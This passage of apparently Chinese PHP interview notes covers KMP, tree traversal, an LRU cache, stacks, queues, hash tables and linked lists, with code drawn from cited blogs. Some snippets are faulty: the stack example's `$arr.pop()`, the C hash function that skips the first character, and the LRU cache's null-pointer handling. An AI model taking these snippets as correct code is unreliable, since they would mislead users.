           if($j===-1 || $str[$i]===$str[$j]){            $i++;            $j++;            $next[$i]=$j;
        }else{            $j=$next[$j];
        }
    }    return $next;
}$str='ABCDABD';$next=cal_next($str);
var_dump($next);function search($str,$search){
    $next=cal_next($search);    $i=0;    $j=0;    $lenStr=strlen($str);    $lenSearch=strlen($search);    while($i<$lenStr && $j<$lenSearch){
            if($j===-1 || $str[$i]===$search[$j]){
            //$i 主串的不后退，移动模式串。为什么没有$j===0，因为如果有$j++为1，下一步是判断$str[$i]===$search[1]，跳过了$search[0]
            $i++;            $j++;
        }else{            $j=$next[$j];
        }
    }    if($j===$lenSearch){        return $i-$j;
    }    return -1;
}
var_dump(search($str,'ABD'));

[KMP算法（1）：如何理解KMP
https://segmentfault.com/a/1190000008575379
[字符串匹配的KMP算法
http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html
[KMP算法最浅显理解
https://blog.csdn.net/starstar1992/article/details/54913261
来源地址：https://www.php.cn/php-weizijiaocheng-392133.html
```

### 深度、广度优先搜索（了解）
```
https://www.cnblogs.com/zemliu/archive/2012/09/24/2700878.html
<?php
    #二叉树的广度优先遍历
    #使用一个队列实现

    class Node {
        public $data = null;
        public $left = null;
        public $right = null;
    }

    #@param $btree 二叉树根节点
    function breadth_first_traverse($btree) {
        $traverse_data = array();
        $queue = array();
        array_unshift($queue, $btree); #根节点入队

        while (!empty($queue)) { #持续输出节点，直到队列为空
            $cnode = array_pop($queue); #队尾元素出队
            $traverse_data[] = $cnode->data;

            #左节点先入队，然后右节点入队
            if ($cnode->left != null) array_unshift($queue, $cnode->left);
            if ($cnode->right != null) array_unshift($queue, $cnode->right);
        }

        return $traverse_data;
    }

    #深度优先遍历,使用一个栈实现
    function depth_first_traverse($btree) {
    $traverse_data = array();
    $stack = array();
    array_push($stack, $btree);

    while (!empty($stack)) {
        $cnode = array_pop($stack);
        $traverse_data[] = $cnode->data;

        if ($cnode->right != null) array_push($stack, $cnode->right);
        if ($cnode->left != null) array_push($stack, $cnode->left);
    }

    return $traverse_data;
    }

    $root = new Node();
    $node1 = new Node();
    $node2 = new Node();
    $node3 = new Node();
    $node4 = new Node();
    $node5 = new Node();
    $node6 = new Node();

    $root->data = 1;
    $node1->data = 2;
    $node2->data = 3;
    $node3->data = 4;
    $node4->data = 5;
    $node5->data = 6;
    $node6->data = 7;

    $root->left = $node1;
    $root->right = $node2;
    $node1->left = $node3;
    $node1->right = $node4;
    $node2->left = $node5;
    $node2->right = $node6;

    $traverse = breadth_first_traverse($root);
    print_r($traverse);
    echo "<br>";
    $traverse = depth_first_traverse($root);
    print_r($traverse);
?>
```

### LRU 缓存淘汰算法（了解，Memcached 采用该算法）
https://learnku.com/articles/34584

缓存是一种提高数据读取性能的技术。但是对于计算机来说，并不可能缓存所有的数据，在达到它的临界空间时，我们需要通过一些规则用新的数据取代掉一部分的缓存数据。这时候你会如果选择替换呢？

替换的策略有很多种，常用的有以下几种:

FIFO (先进先出策略)

LFU (最少使用策略)

LRU (最近最少使用策略)

NMRU (在最近没有使用的缓存中随机选择一个替换)

介于我这篇主要实现 LRU，所以就不去介绍其他的了，可以自行去了解。

假设你已经有 5 个女朋友了，此时你成功勾搭上一个新女朋友，在你沉迷女色的同时，你惊奇的发现，你已经不能像年轻时一样以一敌六了，你必须舍弃若干个女朋友，这时候，身拥六个女朋友的渣男你，彻底展示出你的渣男本色，和最近最少秀恩爱的小姐姐说再见：“对不起，国篮此时需要我挺身发边线球，我楠辞琦咎，再见。”，就这样在你成功勾搭一个新小姐姐，你的身体临界点的同时，你就必须舍弃其他的小姐姐。

下面来张实际点的图搞清楚他的原理。

基于上述图片，我们知道，对于 LRU 的操作，无非在于插入 (insert), 删除 (delete)，以及替换，针对替换来说，如果缓存空间满了，那么就是 insert to head and delete for tail。如果未满，也分为两种，一种是缓存命中的话，只需要把缓存的值 move to head。如果之前不存在，那么就是 insert to head。

实现过程

接下来就是数据结构的选择了。数组的存储是连续的内存空间，虽然查询的时间复杂度是 O (1), 但是删除和插入为了保存内存空间的连续性，需要进行搬移，那么时间复杂度就是 O (n), 为了实现能快速删除，故而采用双向链表。但是链表的查询时间复杂度是 O (n), 那么就需要 hash table。屁话说了这么多，代码实现。其实之前刷过这道题目。特地拿出来讲一下。
```
class LRUCache {
    private $capacity;
    private $list;
    /**
     * @param Integer $capacity
     */
    function __construct($capacity) {
        $this->capacity=$capacity;
        $this->list=new HashList();

    }

    /**
     * @param Integer $key
     * @return Integer
     */
    function get($key) {
        if($key<0) return -1;
        return $this->list->get($key);
    }

    /**
     * @param Integer $key
     * @param Integer $value
     * @return NULL
     */
    function put($key, $value) {
        $size=$this->list->size;
        $isHas=$this->list->checkIndex($key);
        if($isHas || $size+1 > $this->capacity){
            $this->list->removeNode($key);
        }
        $this->list->addAsHead($key,$value);
    }
}

class HashList{
    public $head;
    public $tail;
    public $size;
    public $buckets=[];
    public function __construct(Node $head=null,Node $tail=null){
        $this->head=$head;
        $this->tail=$tail;
        $this->size=0;
    }

    //检查键是否存在
    public function checkIndex($key){
        $res=$this->buckets[$key];
        if($res){
            return true;
        }
        return false;
    }

    public function get($key){
        $res=$this->buckets[$key];
        if(!$res) return -1;
        $this->moveToHead($res);
        return $res->val;
    }

    //新加入的节点
    public function addAsHead($key,$val)
{
        $node=new Node($val);
        if($this->tail==null && $this->head !=null){
            $this->tail=$this->head;
            $this->tail->next=null;
            $this->tail->pre=$node;
        }
        $node->pre=null;
        $node->next=$this->head;
        $this->head->pre=$node;
        $this->head=$node;
        $node->key=$key;
        $this->buckets[$key]=$node;
        $this->size++;
    }

    //移除指针(已存在的键值对或者删除最近最少使用原则)
    public function removeNode($key)
{
        $current=$this->head;
        for($i=1;$i<$this->size;$i++){
            if($current->key==$key) break;
            $current=$current->next;
        }
        unset($this->buckets[$current->key]);
        //调整指针
        if($current->pre==null){
            $current->next->pre=null;
            $this->head=$current->next;
        }else if($current->next ==null){
            $current->pre->next=null;
            $current=$current->pre;
            $this->tail=$current;
        }else{
            $current->pre->next=$current->next;
            $current->next->pre=$current->pre;
            $current=null;
        }
        $this->size--;

    }

    //把对应的节点应到链表头部(最近get或者刚刚put进去的node节点)
    public function moveToHead(Node $node)
{
        if($node==$this->head) return ;
        //调整前后指针指向
        $node->pre->next=$node->next;
        $node->next->pre=$node->pre;
        $node->next=$this->head;
        $this->head->pre=$node;
        $this->head=$node;
        $node->pre=null;
    }

}

class Node{
    public $key;
    public $val;
    public $next;
    public $pre;
    public function __construct($val)
{
        $this->val=$val;
    }
}

/**
 * Your LRUCache object will be instantiated and called as such:
 * $obj = LRUCache($capacity);
 * $ret_1 = $obj->get($key);
 * $obj->put($key, $value);
```

## 数据结构篇（了解）
一、基本概念

（一）编写解决实际问题的程序的一般过程：

1.如何用数据形式描述问题，即将问题抽象为一个数学模型；

2.问题所涉及到的数据量的大小及数据之间的关系；

3.如何在计算机中储存数据及体现数据之间的关系；

4.处理数据时需要对数据执行的操作；

5.编写的程序的性能是否良好。

（二）数据(Data) ：

是客观事物的符号表示，在计算机科学中指的是所有能输入到计算机中并被计算机程序处理的符号的总称。

（三）数据元素(Data Element) ：是数据的基本单位，在程序中通常作为一个整体来进行考虑和处理。一个数据元素可由若干个数据项(Data Item)组成。数据项是数据的不可分割的最小单位。数据项是对客观事物某一方面特性的数据描述。

（四）数据对象(Data Object)：是性质相同的数据元素的集合，是数据的一个子集。如字符集合C={‘A’,’B’,’C,…} 。

（五）数据结构：相互之间具有一定联系的数据元素的集合。

（六）数据的逻辑结构：数据元素之间的相互关系称为逻辑结构。

（七）数据的逻辑结构有四种基本类型：

1.集合：结构中数据元素之间除了“属于同一个集合”外,再也没有其他的关系；

2.线性结构：结构中的数据元素存在一对一的关系；

3.树形结构：结构中的数据元素存在一对多的关系；

4.网状或者图状结构：结构中的数据元素存在多对多的关系；

（八）数据结构的储存方式：由数据元素之间的关系在计算机中有两种不同的表示方法顺序表示和非顺序表示，从则导出两种储存方式，顺序储存结构和链式储存结构

1.顺序存储结构：用数据元素在存储器中的相对位置来表示数据元素之间的逻辑结构(关系)。

2.链式存储结构：在每一个数据元素中增加一个存放另一个元素地址的指针(pointer )，用该指针来表示数据元素之间的逻辑结构(关系)

顺序结构：数据元素存放的地址是连续的；

链式结构：数据元素存放的地址是否连续没有要求。

数据的逻辑结构和物理结构是密不可分的两个方面，一个算法的设计取决于所选定的逻辑结构，而算法的实现依赖于所采用的存储结构

（九）数据操作： 对数据要进行的运算

（十）数据类型(Data Type)：指的是一个值的集合和定义在该值集上的一组操作的总称。

（十一）算法(Algorithm)：是对特定问题求解方法(步骤)的一种描述，是指令的有限序列，其中每一条指令表示一个或多个操作。

（十二）算法具有以下五个特性

1.有穷性： 一个算法必须总是在执行有穷步之后结束，且每一步都在有穷时间内完成。

2.确定性：算法中每一条指令必须有确切的含义。不存在二义性。且算法只有一个入口和一个出口。

3.可行性： 一个算法是能行的。即算法描述的操作都可以通过已经实现的基本运算执行有限次来实现。

4.输入： 一个算法有零个或多个输入，这些输入取自于某个特定的对象集合。

5.输出： 一个算法有一个或多个输出，这些输出是同输入有着某些特定关系的量。

（十三）算法和程序是两个不同的概念：一个计算机程序是对一个算法使用某种程序设计语言的具体实现。算法必须可终止意味着不是所有的计算机程序都是算法。

（十四）评价一个好的算法有以下几个标准

1.正确性(Correctness )： 算法应满足具体问题的需求。

2.可读性(Readability)： 算法应容易供人阅读和交流。可读性好的算法有助于对算法的理解和修改。

3.健壮性(Robustness)： 算法应具有容错处理。当输入非法或错误数据时，算法应能适当地作出反应或进行处理，而不会产生莫名其妙的输出结果。

4.通用性(Generality)： 算法应具有一般性 ，即算法的处理结果对于一般的数据集合都成立。

5.效率与存储量需求： 效率指的是算法执行的时间；存储量需求指算法执行过程中所需要的最大存储空间。一般地，这两者与问题的规模有关。

（十五）算法的时间复杂度：算法中基本操作重复执行的次数是问题规模n的某个函数，其时间量度记作   T(n)=O(f(n))，称作算法的渐近时间复杂度(Asymptotic Time complexity)，简称时间复杂度。

（十六）算法的空间复杂度：是指算法编写成程序后，在计算机中运行时所需存储空间大小的度量。记作：   S(n)=O(f(n)),其中n为问题规模

### 堆、栈特性
https://blog.csdn.net/ljfphp/article/details/80053379

关于堆和栈的概念及区别

php中的堆栈
众所周知，PHP提供了一组函数可以用于push与pop（堆栈）还有shift与unshift（队列）来操作数组元素。

1、push与pop
这两个函数操作的是栈，遵循先进后出的原则。就像是往木桶里面加东西一样。通过array_push进行入栈操作，array_pop进行出栈操作。先进栈的部分在木桶的最下面。

(1)array_push()方法

array_push() 函数向第一个参数的数组尾部添加一个或多个元素（入栈），然后返回新数组的长度。该函数等于多次调用 $array[] = $value。

(2)array_pop()方法

array_pop() 函数删除数组中的最后一个元素。

返回数组的最后一个值。如果数组是空的，或者非数组，将返回 NULL。
(3)实例：
```
 <?php
   $arr = array();
   array_push($arr,'aaa');  //先入栈  aaa
   array_push($arr,'bbb');  //后入栈   bbb
   print_r($arr);   //此时打印结果为：[0]=>aaa,[1]=>bbb
   $arr.pop();   //进行出栈操作，先进后出原则，则此时相当于bbb出栈了。
   print_r($arr);  //打印结果应该是[0]=>aaa
?>
```
三、php实现的队列

1、什么是队列
首先应该明确，队列和普通的堆栈是不一样的，队列遵循的是“先进先出”。堆栈只能在栈顶删除和插入。队列是每一个新插入的元素都是在队列的尾部插入，每一个要删除的元素都是位于队列的头部，当从队列的头部删除了一个元素后，其它队列中的元素就会向前进1位，在元素移动到队首时，就会接受出队的操作。

队列模型可以理解为排队吃饭。先排队的人就先吃到饭。

2、队列的操作

php中使用array_push()来增加元素，使用array_shift()删除元素。

（1）array_shift()方法

array_shift() 函数删除数组中第一个元素，并返回被删除元素的值。
如果键名是数字的，所有元素都会获得新的键名，从 0 开始，并以 1 递增

具体参考手册：http://www.w3school.com.cn/php/func_array_shift.asp

（2）实例：
```
<?php
   $arr = array();
   array_push($arr,'aaa');  //队列中添加  aaa
   array_push($arr,'bbb');  // 队列中添加   bbb
   print_r($arr);  //此时打印输出为  [0]=>aaa,[1]=>bbb
   array_shift($arr); //删除第一个元素，遵循先进先出原则，删除的是aaa
   print_r($arr);  //打印结果为  [0]=>bbb
?>
```
（3）双端队列

还有一种队列比较特殊，首尾两端都允许进行插入和删除的操作，这种队列可以称为双端队列，与标准的队列不同的就是多了队首的插入操作和队尾的删除操作。一般是通过php的数组函数：array_unshift()和array_shift()。

具体参考：PHP队列原理及基于队列的写文件案例

四、队列的用途

队列可以很好地异步处理数据传送和存储，当你频繁地向数据库中插入数据、频繁地向搜索引擎提交数据，就可采取队列来异步插入。另外，还可以将较慢的处理逻辑、有并发数量限制的处理逻辑，通过消息队列放在后台处理，例如FLV视频转换、发送手机短信、发送电子邮件等。

### 队列
https://www.cnblogs.com/be-thebest/p/9983672.html

队列是一种特殊的线性表，它只允许在表的前端，可以称之为front，进行删除操作；而在表的后端，可以称之为rear进行插入操作。队列和堆栈一样，是一种操作受限制的线性表，和堆栈不同之处在于：队列是遵循“先进先出”原则，而堆栈遵循的是“先进后出”原则。队列进行插入操作的端称为队尾，进行删除操作的称为队头，只允许在队尾进行插入操作，在队头进行删除操作。

队列的数据元素又称为队列元素，在队尾中插入一个元素称为入队，在队头删除一个元素称为出队。具体实现参考代码：

```
<?php
/**
*  php队列算法
*  
*  Create On 2010-6-4
*  Author Been
*  QQ:281443751
*  Email:binbin1129@126.com
**/
class data {
    //数据
    private $data;
    
    public function __construct($data){
        $this->data=$data;
        echo $data.":哥进队了！<br>";
    }
    
    public function getData(){
        return $this->data;
    }
    public function __destruct(){
        echo $this->data."：哥走了！<br>";
    }
}
class queue{
    protected $front;//队头
    protected $rear;//队尾
    protected $queue=array('0'=>'队尾');//存储队列
    protected $maxsize;//最大数
    
    public function __construct($size){
        $this->initQ($size);
    }
    //初始化队列
    private function initQ($size){
        $this->front=0;
        $this->rear=0;
        $this->maxsize=$size;
    }
    //判断队空
    public function QIsEmpty(){
        return $this->front==$this->rear;
    }
    //判断队满
    public function QIsFull(){
        return ($this->front-$this->rear)==$this->maxsize;
    }
    //获取队首数据
    public function getFrontDate(){
        return $this->queue[$this->front]->getData();
    }
    //入队
    public function InQ($data){
        if($this->QIsFull())echo $data.":我一来咋就满了！（队满不能入队，请等待！）<br>";
        else {
            $this->front++;
            for($i=$this->front;$i>$this->rear;$i--){
                //echo $data;
                if($this->queue[$i])unset($this->queue[$i]);
                $this->queue[$i]=$this->queue[$i-1];
            }
            $this->queue[$this->rear+1]=new data($data);
            //print_r($this->queue);
            //echo $this->front;
            echo '入队成功！<br>';
        }
    }
    //出队
    public function OutQ(){
        if($this->QIsEmpty())echo "队空不能出队！<br>";
        else{
            unset($this->queue[$this->front]);
            $this->front--;
            //print_r($this->queue);
            //echo $this->front;
            echo "出队成功！<br>";
        }
    }
}
$q=new queue(3);
$q->InQ("小苗");
$q->InQ('马帅');
$q->InQ('溜冰');
$q->InQ('张世佳');
$q->OutQ();
$q->InQ("周瑞晓");
$q->OutQ();
$q->OutQ();
$q->OutQ();
$q->OutQ();
```
本案例中有两个类：

第一个是data类，用于实现数据的存放以及队列元素的入队出队情况；

第二个是queue类，用于队列元素的一些入队出队操作。

队列中包含四个属性：

front(队列的头部）

rear(队列的尾部)

maxsize(队列的长度，即队列元素个数)

queue(存放所有已入队队列元素的对象)

场景说明：

1.初始化队列时，生成一个队列，传入一个参数作为maxsize初始化队列把队尾rear设为0，队头front也设为0，此时queue中只有0号元素，并且rear和front都指向它。

2.入队时，先需要判断队列是否已满（front-rear == maxsize）,如果已满不可在插入，如果未满则允许插入。插入时，front自增，然后依次让队列所有元素向前移动一位（让出队尾位置以便插入新元素），然后生成新的data对象插入到队尾位置。

3.出队时，判断队列是否为空（front == rear），如果为空时，无法出队。如果不为空时，删除front指向的对象，并且front自减，完成出队。

运行结果如下:
```
 1 小苗:哥进队了！
 2 入队成功
 3 马帅:哥进队了！
 4 入队成功
 5 溜冰:哥进队了！
 6 入队成功
 7 张世佳:我一来咋就满了！（队满不能入队，请等待！）
 8 小苗：哥走了！
 9 出队成功！
10 周瑞晓:哥进队了！
11 入队成功
12 马帅：哥走了！
13 出队成功！
14 溜冰：哥走了！
15 出队成功！
16 周瑞晓：哥走了！
17 出队成功！
18 队空不能出队！
19 队空不能出队！
```

### 哈希表
https://www.cnblogs.com/orlion/p/5344126.html

一、哈希表(HashTable)

大部分动态语言的实现中都使用了哈希表，哈希表是一种通过哈希函数，将特定的键映射到特定值得一种数据

结构，它维护键和值之间一一对应关系。

键(key):用于操作数据的标示，例如PHP数组中的索引或者字符串键等等。

槽(slot/bucket):哈希表中用于保存数据的一个单元，也就是数组真正存放的容器。

哈希函数(hash function):将key映射(map)到数据应该存放的slot所在位置的函数。

哈希冲突(hash collision):哈希函数将两个不同的key映射到同一个索引的情况。

目前解决hash冲突的方法有两种：链接法和开放寻址法。

1、冲突解决

(1)链接法

链接法通过使用一个链表来保存slot值的方式来解决冲突，也就是当不同的key映射到一个槽中的时候使用链表

来保存这些值。（PHP中正是使用了这种方式）；

(2)开放寻址法

使用开放寻址法是槽本身直接存放数据，在插入数据时如果key所映射到的索引已经有数据了，这说明有冲突，

这时会寻找下一个槽，如果该槽也被占用了则继续寻找下一个槽，直到找到没有被占用的槽，在查找时也是这样

2、哈希表的实现

哈希表的实现主要完成的工作只有三点:

* 实现哈希函数

* 冲突的解决

* 操作接口的实现

（1）数据结构

首先需要一个容器来曹村我们的哈希表，哈希表需要保存的内容主要是保存进来的数据，同时为了方便的得知哈希表中存储的元素个数，需要保存一个大小字段，第二个需要的就是保存数据的容器。下面将实现一个简易的哈希表，基本的数据结构主要有两个，一个用于保存哈希表本身，另外一个就是用于实际保存数据的单链表了，定义如下：
```
typedef struct _Bucket
{
    char *key;
    void *value;
    struct _Bucket *next;
  
} Bucket;
  
typedef struct _HashTable
{
    int size;
    Bucket* buckets;
} HashTable;
```
上边的定义与PHP中的实现相似，为了简化key的数据类型为字符串，而存储的结构可以为任意类型。

Bucket结构体是一个单链表，这是为了解决哈希冲突。当多个key映射到同一个index的时候将冲突的元素链接起来

（2）哈希函数实现

我们采用一种最简单的哈希算法实现：将key字符串的所有字符加起来，然后以结果对哈希表的大小取模，这样索引就能落在数组索引的范围之内了。
```
static int hash_str(char *key)
{
    int hash = 0;
  
    char *cur = key;
  
    while(*(cur++) != '\0') {
        hash += *cur;
    }
  
    return hash;
}
// 使用这个宏来求得key在哈希表中的索引
#define HASH_INDEX(ht, key) (hash_str((key)) % (ht)->size)
PHP使用的哈希算法称为DJBX33A。为了操作哈希表定义了如下几个操作函数：
int hash_init(HashTable *ht);                               // 初始化哈希表
int hash_lookup(HashTable *ht, char *key, void **result);   // 根据key查找内容
int hash_insert(HashTable *ht, char *key, void *value);     // 将内容插哈希表中
int hash_remove(HashTable *ht, char *key);                  // 删除key所指向的内容
int hash_destroy(HashTable *ht);
```
下面以插入和获取操作函数为例：
```
int hash_insert(HashTable *ht, char *key, void *value)
{
    // check if we need to resize the hashtable
    resize_hash_table_if_needed(ht);    // 哈希表不固定大小，当插入的内容快占满哈希表的存储空间
                                        // 将对哈希表进行扩容，以便容纳所有的元素
    int index = HASH_INDEX(ht, key);    // 找到key所映射到的索引
  
    Bucket *org_bucket = ht->buckets[index];
    Bucket *bucket = (Bucket *)malloc(sizeof(Bucket)); // 为新元素申请空间
  
    bucket->key   = strdup(key);
    // 将值内容保存起来，这里只是简单的将指针指向要存储的内容，而没有将内容复制
    bucket->value = value;  
  
    LOG_MSG("Insert data p: %p\n", value);
  
    ht->elem_num += 1; // 记录一下现在哈希表中的元素个数
  
    if(org_bucket != NULL) { // 发生了碰撞，将新元素放置在链表的头部
        LOG_MSG("Index collision found with org hashtable: %p\n", org_bucket);
        bucket->next = org_bucket;
    }
  
    ht->buckets[index]= bucket;
  
    LOG_MSG("Element inserted at index %i, now we have: %i elements\n",
        index, ht->elem_num);
  
    return SUCCESS;
}
```
在查找时首先找到元素所在的位置，如果存在元素，则将链表中的所有元素的key和要查找的key依次对比，直到找到一致的元素，否则说明该值没有匹配的内容。

```
int hash_lookup(HashTable *ht, char *key, void **result)
{
    int index = HASH_INDEX(ht, key);
    Bucket *bucket = ht->buckets[index];
     if(bucket == NULL) return FAILED;
  
    // 查找这个链表以便找到正确的元素，通常这个链表应该是只有一个元素的，也就不同多次循环
    // 要保证这一点需要有一个合适的哈希算法。
    while(bucket)
    {
        if(strcmp(bucket->key, key) == 0)
        {
            LOG_MSG("HashTable found key in index: %i with  key: %s value: 
%p\n",
                index, key, bucket->value);
            *result = bucket->value;    
            return SUCCESS;
        }
  
        bucket = bucket->next;
    }
  
    LOG_MSG("HashTable lookup missed the key: %s\n", key);
    return FAILED;
}
```
PHP中的数组是基于哈希表实现的，依次给数组添加元素时，元素之间是有顺序的，而这里的哈希表在物理上显然是接近平均分布的，这样是无法根据插入的先后顺序获取到这些元素的，在PHP的实现中Bucket结构体还维护了另一个指针字段来维护元素之间的关系。

二、PHP的哈希表实现

1、PHP的哈希实现

PHP中的哈希表是十分重要的一个数据接口，基本上大部分的语言特征都是基于哈希表的，例如：变量的作用域和变量的存储，类的实现以及Zend引擎内部的数据有很多都是保存在哈希表中的。

(1)数据结构及说明

Zend为了保存数据之间的关系使用了双向链表来保存数据

(2)哈希表结构

PHP中的哈希表实现在Zend/zend_hash.c中，PHP使用如下两个数据结构来实现哈希表，HashTable结构体用于保存整个哈希表需要的基本信息，而Bucket结构体用于保存具体的数据内容，如下：
```
typedef struct _hashtable { 
    uint nTableSize;        // hash Bucket的大小，最小为8，以2x增长
    uint nTableMask;        // nTableSize-1,索引取值的优化
    uint nNumOfElements;    // hash Bucket中当前存在的元素个数，count()函数会直接返回此值
    ulong nNextFreeElement; // 下一个数字索引的位置
    Bucket *pInternalPointer;   // 当前遍历的指针(foreach 比for快的原因之一)
    Bucket *pListHead;          // 存储数头元素指针
    Bucket *pListTail;          // 存储数组尾元素指针
    Bucket **arBuckets;         // 存储hash数组
    dtor_func_t pDestructor;
    zend_bool persistent;
    unsigned char nApplyCount; // 标记当前hash Bucket被递归访问的次数(防止多次递归)
    zend_bool bApplyProtection;// 标记当前hash桶允许不允许多次访问，不允许时，最多只能递归3此
#if ZEND_DEBUG
    int inconsistent;
#endif
} HashTable;
```
TableSize字段用于标示哈希表的容量，哈希表的初始化容量最小为8.首先看看哈希表的初始化函数：

```
ZEND_API int _zend_hash_init(HashTable *ht, uint nSize, hash_func_t 
pHashFunction,
                    dtor_func_t pDestructor, zend_bool persistent 
ZEND_FILE_LINE_DC)
{
    uint i = 3;
    //...
    if (nSize >= 0x80000000) {
        /* prevent overflow */
        ht->nTableSize = 0x80000000;
    } else {
        while ((1U << i) < nSize) {
            i++;
        }
        ht->nTableSize = 1 << i;
    }
    // ...
    ht->nTableMask = ht->nTableSize - 1;
  
    /* Uses ecalloc() so that Bucket* == NULL */
    if (persistent) {
        tmp = (Bucket **) calloc(ht->nTableSize, sizeof(Bucket *));
        if (!tmp) {
            return FAILURE;
        }
        ht->arBuckets = tmp;
    } else {
        tmp = (Bucket **) ecalloc_rel(ht->nTableSize, sizeof(Bucket *));
        if (tmp) {
            ht->arBuckets = tmp;
        }
    }
  
    return SUCCESS;
}
```
例如如果设置初始大小为10，则上面的算法将会将大小调整为16.也就是始终将大小调整为接近初始大小的2的整数次方

为什么这么调整呢？先看看HashTable将哈希值映射到槽位的方法:
```
h = zend_inline_hash_func(arKey, nKeyLength);
nIndex = h & ht->nTableMask;
```
从上边的_zend_hash_init()函数中可知，ht->nTableMask的大小为ht->nTableSize – 1。这里使用&操作而不是使用取模，这是因为相对来说取模的操作的消耗和按位与的操作大很多。

设置好了哈希表的大小后就需要为哈希表申请存储空间了，如上边初始化的代码，根据是否需要持久保存而调用了不同的内存申请方法，是需要持久体现的是在前面PHP生命周期里介绍的：持久内容能在多个请求之间可访问，而如果是非持久存储则会在在请求结束时释放占用的空间。具体内容将在内存管理中详解

HashTable中的nNumOfElements字段很好理解，每插入一个元素或者unset删掉元素时会更新这个字段，这样在进行count()函数统计数组元素个数时就能快速的返回。

nNextFreeElement字段非常有用，先看一段PHP代码：

```
<?php
$a = array(10 => 'Hello');
$a[] = 'TIPI';
var_dump($a);
  
// ouput
array(2) {
  [10]=>
  string(5) "Hello"
  [11]=>
  string(5) "TIPI"
}
```
PHP中可以不指定索引值向数组中添加元素，这时将默认使用数字作为索引，和C语言中的枚举类似，而这个元素的索引到底是多个就由nNextFreeElement字段决定了。如果数组中存在了数字key，则会默认使用最新使用的key+1，如上例中已经存在了10作为key的元素，这样新插入的默认索引就为11了。

下面看看保存哈希表数据的槽位数据结构体：
```
typedef struct bucket {
    ulong h;            // 对char *key进行hash后的值，或者是用户指定的数字索引值
    uint nKeyLength;    // hash关键字的长度，如果数组索引为数字，此值为0
    void *pData;        // 指向value，一般是用户数据的副本，如果是指针数据，则指向pDataPtr
    void *pDataPtr;     // 如果是指针数组，此值会指向真正的value，同时上面pData会指向此值
    struct bucket *pListNext;   // 整个hash表的下一个元素
    struct bucket *pListLast;   // 整个hash表的上一个元素
    struct bucket *pNext;       // 存放在同一个hash Bucket内的下一个元素
    struct bucket *pLast;       // 存放在同一个hash Bucket内的上一个元素
    char arKey[1];  
    /*
    存储字符索引，此项必须放在最末尾，因为此处只定义了1个字节，存储的实际上是指向char *key的值，
    这就意味着可以省去再赋值一次的消耗，而且，有时此值并不需要，所以同时还节省了空间。
    */
} Bucket;
```
如上面各字段的注释。h字段保存哈希表key哈希后的值。在PHP中可以使用字符串或者数字作为数组的索引。因为数字的索引是唯一的。如果再进行一次哈希将会极大的浪费。h字段后面的nKeyLength字段是作为key长度的标示，如果索引是数字的话，则nKeyLength为0.在PHP中定义数组时如果字符串可以被转换成数字也会进行转换。所以在PHP中例如'10','11'这类的字符索引和数字索引10,11没有区别

Bucket结构体维护了两个双向链表，pNext和pLast指针分别指向本槽位所在的链表的关系

而pListNext和pListLast指针指向的则是整个哈希表所有的数据之间的链接关系。HashTable结构体中的pListHead和pListTail则维护整个哈希表的头元素指针和最后一个元素的指针

哈希表的操作接口：

PHP提供了如下几类操作接口：

初始化操作，例如zend_hash_init()函数，用于初始化哈希表接口，分配空间等。

查找，插入，删除和更新操作接口，这是比较常规的操作。

迭代和循环，这类的接口用于循环对哈希表进行操作。

复制，排序，倒置和销毁等操作。

### 链表
https://www.cnblogs.com/followyou/p/11162030.html

链表

链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。

形式：单链表、双链表、跳表（redis 集合数据结构就是跳表实现，时间复杂度O（log N））

跳表了解：https://lotabout.me/2018/skip-list/

php实现对链表的增删改查操作
定义节点类：
```
<?php
class Node
{
    public $val;
    public $next;



    public function __construct( $val = null, $next = null )
    {
        $this->val  = $val;
        $this->next = $next;
    }


}
```
链表类：

```
<?php
/**链表
 * Class Linklist
 * @package app\models
 */
class Linklist
{
    public $head;           //头节点(默认一个虚拟头节点)
    public $size;           //长度

    public function __construct()
    {
        $this->head = new Node();
        $this->size  = 0;
    }

    //头插法
    public function addFirst( $value ){
//        $node = new Node($value);
//        $node->next = $this->head;
//        $this->head = $node;

        //简化
//        $this->head = new Node( $value, $this->head );
//        $this->size++;

        $this->add(0,$value);
    }

    /**指定索引位置插入
     * @param $index
     * @param $value
     * @throws Exception
     */
    public function add( $index, $value ){

        if( $index > $this->size )
            throw new Exception('超过链表范围');

//        if( $index==0 ){
//            $this->addFirst($value);
//        }else{
            $prev = $this->head;
            for($i=0;$i<$index;$i++){
                $prev = $prev->next;
            }

//            $node = new Node($value);
//            $node->next = $prev->next;
//            $prev->next = $node;

            $prev->next = new Node($value,$prev->next);
//        }

        $this->size++;
    }

    /**尾插法
     * @param $value
     */
    public function addLast( $value ){

        $this->add($this->size,$value);

    }


    /***
     * 编辑
     * @param $index
     * @param $value
     * @throws Exception
     */
    public function edit( $index, $value ){
        if( $index > $this->size-1 )
            throw new Exception('超过链表范围');

        $prev = $this->head->next;
        for($i=0;$i<=$index;$i++){
            if( $i==$index )
                $prev->val = $value;
            $prev = $prev->next;
        }

    }

    /**
     * 查询
     * @param $index
     * @return null
     * @throws Exception
     */
    public function select($index){
        if( $index > $this->size-1 )
            throw new Exception('超过链表范围');

        $prev = $this->head->next;
        for($i=0;$i<=$index;$i++){
            if( $i==$index )
                return $prev;
            $prev = $prev->next;
        }
    }


    /**删除
     * @param $index
     * @throws Exceptionr
     */
    public function delete( $index ){
        if( $index > $this->size-1 )
            throw new Exception('超过链表范围');

        $prev = $this->head;
        for($i=0;$i<=$index;$i++){
            if( $i==$index )
               $prev->next = $prev->next->next;
            $prev = $prev->next;
        }
        $this->size--;
    }

    /**检索值是否存在
     * @param $value
     * @return bool
     */
    public function iscontain( $value ){
        $prev = $this->head->next;
        while( $prev ){

            if( $prev->val==$value ){
                return true;
            }
            $prev = $prev->next;
        }

        return false;
    }

    /**转换为字符串
     * @return string
     */
    public function tostring(){

        $prev = $this->head->next;

        $r = [];
        while( $prev ){
            $r[] = $prev->val;
            $prev = $prev->next;
        }
        return implode('->',$r);

    }
    
     /**
      * 删除指定的节点值
      * @param $value
      */
      public function removeFileds( $value ){
           $prev = $this->head;
           while( $prev->next ){
               if( $prev->val == $value ){
                   $prev->val = $prev->next->val;
                   $prev->next = $prev->next->next;
               }else{
                   $prev = $prev->next;
               }
           }
      }
      
       /**
        * 通过递归方式删除指定的节点值
        * @param $value
        */
       public function removeFiledsByRecursion( $value ){
           $this->head = $this->removeByRecursion( $this->head ,$value);
           return $this->head;
       }
   
